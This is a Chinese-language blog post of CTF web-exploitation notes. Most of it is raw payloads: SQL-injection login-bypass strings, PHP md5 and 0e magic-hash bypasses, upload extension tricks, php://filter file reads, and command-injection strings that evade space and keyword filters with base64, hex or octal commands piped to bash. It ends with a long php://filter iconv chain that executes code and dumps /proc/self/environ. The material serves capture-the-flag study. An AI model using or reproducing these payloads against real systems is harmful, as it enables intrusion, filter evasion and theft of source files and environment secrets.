title: CTF
tags: []
categories: []
author: Jue
date: 2022-11-11 16:56:00
---
# 代码审计
数组绕过：php的md5函数无法处理数组，如果传入数组，则会返回none。md5用数组绕，md5()函数无法操作数组，返回NULL，两个NULL相等

is_numeric()函数用1234567a绕。1234567a是字符串，但是弱比较的时候，1在前，php会将其整体转成数字，就可以通过比较了，变成is_numberic(1234567)。

# SQL
万能公式
<code>
1 and 1=1
1' and '1'='1
1 or 1=1 
1' or '1'='1</code>

一些绕过方式<code>
'oorr 1=1#
</code>

网上无脑搜的万能公式变形，不一定对
<code>
admin 'or '1'='1'# （# 为注释后面内容）
James') or 1=1#
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*
something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
</code>  

md5($pass)方式

<code>ffifdyop</code>

①使用数组使得md5值相等,通过md5不能处理数组来绕过

payload:<code>?a[]=1&b[]=2</code>

②使用科学计数法使得md5值相等， 0e开头的数字会当做科学计数法解析
<code>
QNKCDZO -- 0e830400451993494058024219903391
s878926199a -- 0e545993274517709034328855841020
s155964671a -- 0e342768416822451524974117254469
s214587387a -- 0e848240448830537924465865611904
s214587387a -- 0e848240448830537924465865611904
s878926199a -- 0e545993274517709034328855841020
s1091221200a -- 0e940624217856561557816327384675
s1885207154a -- 0e509367213418206700842008763514
240610708 -- 0e462097431906509019562988736854
</code>
payload:<code>?a=QNKCDZO&b=s878926199a</code>

# upload
php常见绕过方式：<code>php,php3,php4,php5,phtml.pht</code>

# 文件包含漏洞
我们可以利用php://filter伪协议来查看flag.php的源代码，
构造payload：
<code>
  ?file=php://filter/convert.base64-encode/resource=flag.php
</code>
这样即可读到flag.php文件base64加密过后的内容。
然而，对于filter协议，不只有这一种写法（#这一种是指定读链的筛选列表）：
<code>
?file=php://filter/read=convert.base64-encode/resource=flag.php</code>

# 文件执行漏洞

一个CTF的payload:http://921f797d-bf6f-4e34-94e5-a9bec97e6756.node4.buuoj.cn:81/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php

空格绕过
<code>
${IFS}
${IFS}$1
$IFS$1
<和<>
{cat,flag}
%20替换
%0a （换行）
%0d （回车）
%09 （tab）</code>

黑名单(关键字）绕过

单引号、双引号绕过：<code>c"at"t fl''ag</code>

反斜线绕过：<code>ca\t fl\ag</code>

num和@绕过：<code>c$1at fl$@ag</code>

拼接绕过：<code>a=c;b=at;c=fl;d=ag; $a$b $c$d </code>（不用加｜）

<code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>

或者

<code>/?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</code>

base64：

<code>echo "Y2F0IGZsYWc="|base64 -d</code>

<code>echo "Y2F0IGZsYWc="|base64 -d|bash</code>

<code>|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>

hex编码绕过：

<code>echo "0x63617420666c61670a" | xxd -r -p|bash</code>

oct编码绕过：

<code>$(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")</code>

<code>{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67"}|$0</code>

内联绕过：

<code>?ip=127.0.0.1;cat 'ls'</code>

<code>?ip=127.0.0.1;cat $(ls)</code>

# 伪协议
`http://node5.anna.nssctf.cn:28078/index.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php&0=cat+/proc/self/environ`